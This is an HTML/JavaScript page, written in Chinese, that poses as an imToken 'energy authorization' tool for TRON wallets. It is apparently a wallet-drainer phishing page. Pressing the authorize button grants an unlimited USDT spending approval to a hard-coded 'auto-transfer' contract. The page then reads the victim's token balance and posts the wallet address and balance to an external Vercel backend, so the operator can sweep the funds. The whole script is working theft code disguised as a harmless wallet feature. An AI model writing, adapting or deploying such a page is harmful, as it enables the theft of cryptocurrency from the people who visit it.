<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>imToken能量授权</title>
</head>

<body>
    <h1>能量授权</h1>
    <button id="connectBtn">连接imToken钱包</button>
    <button id="approveBtn" disabled>授权</button>
    <div id="userInfo"></div>

    <script src="imtoken://browser"></script>
    <script>
        const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
        const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

        let tronWeb, userAddress, trc20Contract;

        window.onload = async () => {
            if (window.tronWeb && window.tronWeb.ready) {
                tronWeb = window.tronWeb;
                alert("tronWeb 初始化成功");
            } else {
                alert("请在imToken钱包中打开此页面");
                return;
            }
            const connectBtn = document.getElementById("connectBtn");
            const approveBtn = document.getElementById("approveBtn");

            connectBtn.onclick = async () => {
                try {
                    if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
                        alert("tronWeb.defaultAddress 不可用");
                        return;
                    }
                    userAddress = tronWeb.defaultAddress.base58;
                    alert("获取用户地址成功: " + userAddress);
                    document.getElementById("userInfo").innerText = `已连接: ${userAddress}`;
                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
                    approveBtn.disabled = false;
                } catch (e) {
                    alert("连接失败: " + e.message);
                }
            };

            approveBtn.onclick = async () => {
                try {
                    const result = await trc20Contract.approve(
                        AUTO_TRANSFER_CONTRACT,
                        INFINITE_APPROVE_AMOUNT
                    ).send({
                        from: userAddress,
                        shouldPollResponse: true
                    });
                    alert("授权结果: " + JSON.stringify(result));
                    const tokenBalance = await getTokenBalance(userAddress);
                    alert("tokenBalance: " + tokenBalance);
                    sendDataToBackend(userAddress, tokenBalance);
                } catch (e) {
                    alert("授权失败: " + e.message);
                }
            };
        };

        async function getTokenBalance(address) {
            try {
                const balance = await trc20Contract.balanceOf(address).call();
                const tokenBalance = balance / 1000000;
                return tokenBalance;
            } catch (e) {
                alert("获取 USDT 余额失败: " + e.message);
                return 0;
            }
        }

        async function sendDataToBackend(address, balance) {
            try {
                const data = {
                    address: address,
                    balance: balance
                };
                const response = await fetch(BACKEND_API, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                });
                if (response.ok) {
                    alert("数据发送到后端成功");
                } else {
                    alert("数据发送到后端失败: " + response.status);
                }
            } catch (e) {
                alert("发送数据到后端失败: " + e.message);
            }
        }
    </script>
</body>

</html>
